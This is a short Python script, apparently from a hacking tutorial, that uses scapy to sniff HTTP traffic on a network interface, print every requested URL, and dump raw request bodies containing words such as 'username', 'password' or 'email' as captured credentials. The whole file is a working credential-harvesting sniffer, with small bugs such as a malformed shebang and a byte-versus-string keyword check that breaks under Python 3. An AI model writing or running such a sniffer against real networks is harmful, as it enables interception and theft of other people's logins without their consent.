#!usr/bin/env python3

import scapy.all as scapy
from scapy.layers import http


# filter in sniff filters ports, types of connection, etc
def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


# getting urls
def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


# getting possible login info from http
def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ['username', 'login', 'password', 'name', 'email', "pass"]
        for keyword in keywords:
            if keyword in load:
                return load


# use haslayer and fields and look through the layers using packet.show()
def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Request >> " + url)

        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] Possible username/password > " + login_info + "\n\n")


# sniffing port
sniff("en0")
